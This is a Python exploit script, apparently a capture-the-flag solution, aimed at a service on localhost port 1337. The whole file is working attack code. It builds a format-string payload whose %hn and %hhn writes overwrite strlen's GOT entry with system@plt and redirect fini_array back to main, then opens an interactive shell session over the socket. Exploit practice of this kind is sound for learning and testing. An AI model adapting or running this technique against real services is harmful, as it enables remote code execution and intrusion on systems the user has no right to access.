import socket
import struct
import telnetlib

target_host = "localhost"
target_port = 1337

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((target_host,target_port))


strlen_got = 0x8049a54 # writable memory
system_plt = 0x8048490 # write address
fini_array = 0x8049934 # writable memory
main_addr  = 0x80485ed # write address

print("[+] strlen_got = {0:x}".format(strlen_got))
print("[+] system_plt = {0:x}".format(system_plt))
print("[+] fini_array = {0:x}".format(fini_array))
print("[+] main_addr = {0:x}".format(main_addr))

# Format String Attack

buf = 'A' * 2 # padding
index = 12 # index of format string itself
already_output = 18 # output byte ("Nice to meet you")

# write system_plt to strlen_got
buf += struct.pack('<I',strlen_got)
buf += struct.pack('<I',strlen_got + 2)

# write fini_array to main_addr
buf += struct.pack('<I',fini_array)

# System Plt Map
spm = list()
spm.append(system_plt & 0x0000ffff)
spm.append((system_plt & 0xffff0000) >> 16)
print(spm)
# Main Address Map
mam = list()
mam.append(main_addr & 0x000000ff)
print(mam)


mam[0] = ((mam[0] - (spm[1] & 0x000000ff) - 1) % 0x100) + 1
spm[1] = ((spm[1] - spm[0] - 1) % 0x10000) + 1
spm[0] = ((spm[0] - (len(buf) + already_output) - 1) % 0x10000) + 1

buf += "%%%dc%%%d$hn" % (spm[0],index)
buf += "%%%dc%%%d$hn" % (spm[1],index + 1)
buf += "%%%dc%%%d$hhn" % (mam[0],index + 2)

buf += '\n'
print(len(buf))
s.recv(1024)
s.send(buf)

fd = open('buf','wb')
fd.write(buf)
fd.close()

t = telnetlib.Telnet()
t.sock = s
t.interact()
